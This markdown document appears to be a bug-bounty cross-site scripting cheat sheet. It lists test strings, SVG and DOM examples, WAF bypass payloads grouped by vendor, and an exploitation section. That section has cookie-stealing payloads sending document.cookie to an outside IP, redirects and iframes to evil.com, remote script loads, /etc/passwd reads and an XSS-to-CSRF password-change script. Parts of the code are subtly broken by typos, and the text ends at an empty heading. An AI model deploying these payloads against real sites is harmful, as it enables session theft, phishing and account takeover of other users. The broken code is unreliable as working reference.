# XSS

### Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

**To Test any Input Field** ⇒ `h0tak88r’”><`

[XSS Polyglot payloads (github.com)](https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626)

- **DOM-based XSS**
    
    ```bash
    <html
    	<h1> You Searched for:</h1> 
    		 <div id ="searchquery"> </div> 
    			 <script>  **var** keyword = location.**search**.**substring**(3);  
    				document.querySelector('searchquery').innerHTML = keyword;  <script> 
    </html
    ```
    
    The above source code is an example of DOM based XSS.
    
- **Stored XSS via SVG file**
    
    is an example of a basic SVG file that will show a picture of a `rectang`
    
    ```bash
    <svg width="400" height="110">  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> </svg><!--This means you can place an SVG file in an image tag and it will render perfectly:--><img src="rectangle.svg" alt="Rectangle" height="42" width="42"><!-- An example SVG file with an alert XSS payload can be found below:--><?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> <script type="text/javascript"> alert("Ghostlulz XSS"); </script></svg>
    ```
    
- **Stored XSS in (input-link) Field**
    - [ ]  Test if Hecheck For charackter or he search for [ http, https]
        - [ ]  `xhttps://google.com`
    - [ ]  `javascript:alert(0)//https://google.com`
    - [ ]  /?url=`javascript:alert(0)//https://google.com`
- **XSS Reflected in JSON Format and “{}” Forbidden**
    - [ ]  `/?q=test%2Aconsole.log(1337)//’;`
    
   ![image](https://user-images.githubusercontent.com/108616378/219940132-46f7abe3-2ac4-425d-aa29-09e54d2c62b4.png)
    
- **XSS Reflected in `<link>` OR `<input type=hidden>` attribute when add param**
    - [ ]  `/?lol=h0tak88r’accesskey=’x’onclick=’alert(0)’` But the Victim must click `ALT+SHIFT+X`
    
   ![image](https://user-images.githubusercontent.com/108616378/219940162-49b746e2-b5a2-46ff-bcd2-0d2755a131a8.png)
    
- **XSS in email section**
    
    ```html
    "hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
    ```
    
- **XSS for .JSON endpoint [ bypass (`.html`)and `WAF` ]**
    - [ ]  `“resource Type” : “silent:nonexitsting”` Function
        
        ![image](https://user-images.githubusercontent.com/108616378/219940178-c7988e77-c51a-4e79-add2-e0b192d92e02.png)
        
    - [ ]  Use `url-encoded` payload with .`htm` extension and `//`   for break directory block too , So the server so the server didn’t understand my request fully
    - [ ]  POC
    
    ```html
    https://www.redacted.com/etc/designs/redacted.json//%3Csvg%20onload=alert(document.domain)%3E.html
    ```
    
- **XSS Bypass for Rich Text Editors**
    - [ ]  First, try all the built-in functions like bold, links, and embedded images.
    - [ ]  `<</p>iframe src=javascript:alert()//`
    - [ ]  `<a href="aaa:bbb">x</a>`
    - [ ]  `<a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>`
- **WAF Bypass**
    
    ```html
    <style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>
    %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
    [̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
    ---------------------------------------------
    "><input/onauxclick="[1].map(prompt)">
    <img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
    '"--><Body onbeforescriptexecute="[1].map(confirm)">
    '-prompt.call(window, 'xss')-'
    <svg+onload=innerHTML=URL,outerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
    <svg+onload=innerHTML=URL,outerHTML=textContent>#<img/src/onerror=alert(domain)>
    ---------------------------------------------------------
    <img src=x onVector=X-Vector onerror=alert(1)>
    %2sscript%2ualert()%2s/script%2u
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    -------------------------------------------------
    toString=\u0061lert;window+' '
    aaaaa<h1 onclick=alert(1)>test
    <noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
    ---------------------------------------------------------------
    # Unicode + HTML
    <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
    # URL
    <a href="javascript:x='%27-alert(1)-%27';">XSS</a>
    # Hex
    <script>eval('\x61lert(1)')</script>
    ----------------------------------------------------------
    # Only lowercase block
    <sCRipT>alert(1)</sCRipT>
    
    # Break regex
    <script>%0aalert(1)</script>
    
    # Double encoding
    %2522
    
    # Recursive filters
    <scr<script>ipt>alert(1)</scr</script>ipt>
    
    # Inject anchor tag
    <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
    
    # Bypass whitespaces
    <svg·onload=alert(1)>
    
    # Change GET to POST request
    
    # Imperva Incapsula
    %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
    <img/src="x"/onerror="[JS-F**K Payload]">
    <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
    
    # WebKnight
    <details ontoggle=alert(1)>
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
    
    # F5 Big IP
    <body style="height:1000px" onwheel="[DATA]">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
    <body style="height:1000px" onwheel="[JS-F**k Payload]">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
    <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
    
    # Barracuda WAF
    <body style="height:1000px" onwheel="alert(1)">
    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
    
    # PHP-IDS
    <svg+onload=+"[DATA]"
    <svg+onload=+"aler%25%37%34(1)"
    
    # Mod-Security
    <a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
    <b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
    
    # Quick Defense:
    <input type="search" onsearch="aler\u0074(1)">
    <details ontoggle="aler\u0074(1)">
    
    # Sucuri WAF
    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
    
    # Akamai
    1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
    <SCr%00Ipt>confirm(1)</scR%00ipt>
    # AngularJS
    {{constructor.constructor(alert 1 )()}}
    ```
    
- **XSS Exploitation**
    
    ```html
    # Some XSS exploitations
    
    ## host header injection through xss
    hostheader: bing.com">script>alert(document.domain)</script><"
    
    ## URL redirection through xss
    document.location.href="http://evil.com"
    
    ## phishing through xss - iframe injection
    <iframe src="http://evil.com" height="100" width="100"></iframe>
    
    ## Cookie stealing through xss
    https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
    https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
    <script>var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
    <img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;>
    <img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');">
    
    ## file upload  through xss
    upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
    
    ## remote file inclusion (RFI) through xss
    php?=http://brutelogic.com.br/poc.svg - xsspayload
    
    ## convert self xss to reflected one
    copy response in a file.html -> it will work
    
    # XSS to SSRF
    <esi:include src="http://yoursite.com/capture" />
    
    # XSS to LFI
    <script>	x=new XMLHttpRequest;	x.onload=function(){ document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>
    
    <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
    <script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
    ```
    
    ### XSS to CSRF [ [https://link.medium.com/ct4S2BiJYwb](https://link.medium.com/ct4S2BiJYwb) ]
    
    POC : `[https://vulnerable.site/profile.php?msg=<](https://vulnerable.site/profile.php?msg=<script)scriptsrc=’https://attacker.site/attacker/script.js’></script>`
    
    ```jsx
    var csrfProtectedPage ='https://vulnerable.site/profile.php'
    var csrfProtectedForm ='form'
    //get valid token for current request
    var html = get(csrfProtectedPage);
    	document.getElementbyId(csrfProtectedForm);
    var token = form.token.value;
    
    //Build with valid token 
    document.body.innerHTML+='form id="myform"action="+csrfProtectedPage+"method="POST">'+'<input id="password"name="name"value="hacked">'+'</form>';
    
    // Auto submit form 
    document.forms["myfor"].submit();
    function get(url){
    var xmlHttp = new XMLHttpRequest();
    xamlHttp.open("GET", url.false);
    xmlGttp.send(null)
    return xmlHttp.responseText;
    }
    ```
    
- **XSS Polygots**
